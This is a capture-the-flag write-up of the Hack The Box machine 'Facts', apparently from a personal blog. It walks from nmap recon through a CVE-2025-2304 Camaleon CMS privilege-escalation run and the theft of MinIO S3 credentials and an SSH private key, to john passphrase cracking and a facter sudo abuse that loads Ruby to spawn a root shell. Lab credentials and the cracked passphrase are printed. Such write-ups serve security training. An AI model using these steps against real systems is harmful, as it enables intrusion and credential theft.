---
title: Facts
date: 2026-05-30
description: Easy Linux machine running Camaleon CMS with a MinIO storage backend — exploiting CVE-2025-2304 for admin privilege escalation, extracting S3 credentials to recover a passphrase-protected SSH key from an internal bucket, and abusing a facter sudo rule for root.
tags:
  - htb
  - Easy
  - Linux
---

# Initial Recon

```sh
# Nmap 7.95 scan initiated Fri May 29 18:31:46 2026 as: /usr/lib/nmap/nmap -p22,80,54321,56333 -A -oN scan_results.txt 10.129.228.20
Nmap scan report for facts.htb (10.129.228.20)
Host is up (0.25s latency).

PORT      STATE  SERVICE VERSION
22/tcp    open   ssh     OpenSSH 9.9p1 Ubuntu 3ubuntu3.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 4d:d7:b2:8c:d4:df:57:9c:a4:2f:df:c6:e3:01:29:89 (ECDSA)
|_  256 a3:ad:6b:2f:4a:bf:6f:48:ac:81:b9:45:3f:de:fb:87 (ED25519)
80/tcp    open   http    nginx 1.26.3 (Ubuntu)
|_http-title: facts
|_http-server-header: nginx/1.26.3 (Ubuntu)
54321/tcp open   http    Golang net/http server
|_http-server-header: MinIO
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.0 400 Bad Request
|     Accept-Ranges: bytes
|     Content-Length: 303
|     Content-Type: application/xml
|     Server: MinIO
|     Strict-Transport-Security: max-age=31536000; includeSubDomains
|     Vary: Origin
|     X-Amz-Id-2: dd9025bab4ad464b049177c95eb6ebf374d3b3fd1af9251148b658df7ac2e3e8
|     X-Amz-Request-Id: 18B40B0E736FF511
|     X-Content-Type-Options: nosniff
|     X-Xss-Protection: 1; mode=block
|     Date: Fri, 29 May 2026 13:05:09 GMT
|     <?xml version="1.0" encoding="UTF-8"?>
|     <Error><Code>InvalidRequest</Code><Message>Invalid Request (invalid argument)</Message><Resource>/nice ports,/Trinity.txt.bak</Resource><RequestId>18B40B0E736FF511</RequestId><HostId>dd9025bab4ad464b049177c95eb6ebf374d3b3fd1af9251148b658df7ac2e3e8</HostId></Error>
|   GenericLines, Help, RTSPRequest, SSLSessionReq: 
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|     Request
|   GetRequest: 
|     HTTP/1.0 400 Bad Request
|     Accept-Ranges: bytes
|     Content-Length: 276
|     Content-Type: application/xml
|     Server: MinIO
|     Strict-Transport-Security: max-age=31536000; includeSubDomains
|     Vary: Origin
|     X-Amz-Id-2: dd9025bab4ad464b049177c95eb6ebf374d3b3fd1af9251148b658df7ac2e3e8
|     X-Amz-Request-Id: 18B40B0A1875523C
|     X-Content-Type-Options: nosniff
|     X-Xss-Protection: 1; mode=block
|     Date: Fri, 29 May 2026 13:04:50 GMT
|     <?xml version="1.0" encoding="UTF-8"?>
|     <Error><Code>InvalidRequest</Code><Message>Invalid Request (invalid argument)</Message><Resource>/</Resource><RequestId>18B40B0A1875523C</RequestId><HostId>dd9025bab4ad464b049177c95eb6ebf374d3b3fd1af9251148b658df7ac2e3e8</HostId></Error>
|   HTTPOptions: 
|     HTTP/1.0 200 OK
|     Vary: Origin
|     Date: Fri, 29 May 2026 13:04:51 GMT
|_    Content-Length: 0
|_http-title: Did not follow redirect to http://facts.htb:9001
56333/tcp closed unknown
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port54321-TCP:V=7.95%I=7%D=5/29%Time=6A198E41%P=aarch64-unknown-linux-g
SF:nu%r(GenericLines,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Typ
SF:e:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x
SF:20Bad\x20Request")%r(GetRequest,2B0,"HTTP/1\.0\x20400\x20Bad\x20Request
SF:\r\nAccept-Ranges:\x20bytes\r\nContent-Length:\x20276\r\nContent-Type:\
SF:x20application/xml\r\nServer:\x20MinIO\r\nStrict-Transport-Security:\x2
SF:0max-age=31536000;\x20includeSubDomains\r\nVary:\x20Origin\r\nX-Amz-Id-
SF:2:\x20dd9025bab4ad464b049177c95eb6ebf374d3b3fd1af9251148b658df7ac2e3e8\
SF:r\nX-Amz-Request-Id:\x2018B40B0A1875523C\r\nX-Content-Type-Options:\x20
SF:nosniff\r\nX-Xss-Protection:\x201;\x20mode=block\r\nDate:\x20Fri,\x2029
SF:\x20May\x202026\x2013:04:50\x20GMT\r\n\r\n<\?xml\x20version=\"1\.0\"\x2
SF:0encoding=\"UTF-8\"\?>\n<Error><Code>InvalidRequest</Code><Message>Inva
SF:lid\x20Request\x20\(invalid\x20argument\)</Message><Resource>/</Resourc
SF:e><RequestId>18B40B0A1875523C</RequestId><HostId>dd9025bab4ad464b049177
SF:c95eb6ebf374d3b3fd1af9251148b658df7ac2e3e8</HostId></Error>")%r(HTTPOpt
SF:ions,59,"HTTP/1\.0\x20200\x20OK\r\nVary:\x20Origin\r\nDate:\x20Fri,\x20
SF:29\x20May\x202026\x2013:04:51\x20GMT\r\nContent-Length:\x200\r\n\r\n")%
SF:r(RTSPRequest,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x
SF:20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Ba
SF:d\x20Request")%r(Help,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent
SF:-Type:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n4
SF:00\x20Bad\x20Request")%r(SSLSessionReq,67,"HTTP/1\.1\x20400\x20Bad\x20R
SF:equest\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\nConnection:\
SF:x20close\r\n\r\n400\x20Bad\x20Request")%r(FourOhFourRequest,2CB,"HTTP/1
SF:\.0\x20400\x20Bad\x20Request\r\nAccept-Ranges:\x20bytes\r\nContent-Leng
SF:th:\x20303\r\nContent-Type:\x20application/xml\r\nServer:\x20MinIO\r\nS
SF:trict-Transport-Security:\x20max-age=31536000;\x20includeSubDomains\r\n
SF:Vary:\x20Origin\r\nX-Amz-Id-2:\x20dd9025bab4ad464b049177c95eb6ebf374d3b
SF:3fd1af9251148b658df7ac2e3e8\r\nX-Amz-Request-Id:\x2018B40B0E736FF511\r\
SF:nX-Content-Type-Options:\x20nosniff\r\nX-Xss-Protection:\x201;\x20mode=
SF:block\r\nDate:\x20Fri,\x2029\x20May\x202026\x2013:05:09\x20GMT\r\n\r\n<
SF:\?xml\x20version=\"1\.0\"\x20encoding=\"UTF-8\"\?>\n<Error><Code>Invali
SF:dRequest</Code><Message>Invalid\x20Request\x20\(invalid\x20argument\)</
SF:Message><Resource>/nice\x20ports,/Trinity\.txt\.bak</Resource><RequestI
SF:d>18B40B0E736FF511</RequestId><HostId>dd9025bab4ad464b049177c95eb6ebf37
SF:4d3b3fd1af9251148b658df7ac2e3e8</HostId></Error>");
Device type: general purpose|router
Running: Linux 5.X, MikroTik RouterOS 7.X
OS CPE: cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
OS details: Linux 5.0 - 5.14, MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 56333/tcp)
HOP RTT       ADDRESS
1   271.04 ms 10.10.14.1
2   271.21 ms facts.htb (10.129.228.20)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Fri May 29 18:33:18 2026 -- 1 IP address (1 host up) scanned in 92.68 seconds
```
Directory fuzzing surfaced an admin panel:

```text
302      GET        0l        0w        0c http://facts.htb/admin => http://facts.htb/admin/login
```

Registration was open at `http://facts.htb/admin/register` — after creating an account, the panel revealed **Camaleon CMS v2.9.0**.

# User

## Admin Privilege Escalation

Camaleon CMS 2.9.0 is vulnerable to **CVE-2025-2304** — an authenticated privilege escalation through mass assignment:

```bash
python exploit.py -u http://facts.htb -U username -P password -e
```

With admin access, **Settings → General site → Filesystem settings** exposed AWS S3 credentials:

```text
AWS Access Key ID: AKIAE15387E6C8B7FDA9
AWS Secret Access Key: 6vzfHleyfnk5mHyy9CMx5Jve2Y6hhWK7CUMsc3k4
Endpoint: http://facts.htb:54321
```

## MinIO Bucket Enumeration

Configured the AWS CLI and listed buckets against the MinIO endpoint:

```bash
aws configure
```

```bash
aws --endpoint-url http://facts.htb:54321/ s3 ls
```

```text
internal
randomfacts
```

The `internal` bucket mapped to a user's home directory — including `.ssh`:

```bash
aws --endpoint-url http://facts.htb:54321/ s3 ls s3://internal/.ssh/
```

Downloaded the keys:

```bash
aws --endpoint-url http://facts.htb:54321/ s3 cp s3://internal/.ssh/id_ed25519 ./id_ed25519
```

## Passphrase Cracking

The private key was protected with a passphrase. Cracked with `john`:

```bash
ssh2john id_ed25519 > pvt.john
```

```bash
john pvt.john --wordlist=/usr/share/wordlists/rockyou.txt
```

```text
Passphrase : dragonballz
```

Regenerated the public key to confirm the username, then authenticated:

```bash
ssh-keygen -y -P "dragonballz" -f id_ed25519
```

```text
ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIAdoaFzA1dTljVhoQl8mur9/s/0Rzj/xNxDwnfg8WQJ7 trivia@facts.htb
```

```bash
ssh -i id_ed25519 trivia@facts.htb
```

# Root

```bash
sudo -l

User trivia may run the following commands on facts:   
(ALL) NOPASSWD: /usr/bin/facter
```

**facter** reports system facts but honors `--custom-dir` even when `FACTERLIB` is blocked by `env_reset` — loading arbitrary Ruby code:

```bash
echo 'exec("/bin/bash")' > exploit.rb
```

```bash
sudo facter --custom-dir /home/trivia exploit.rb
```

Gained `root`
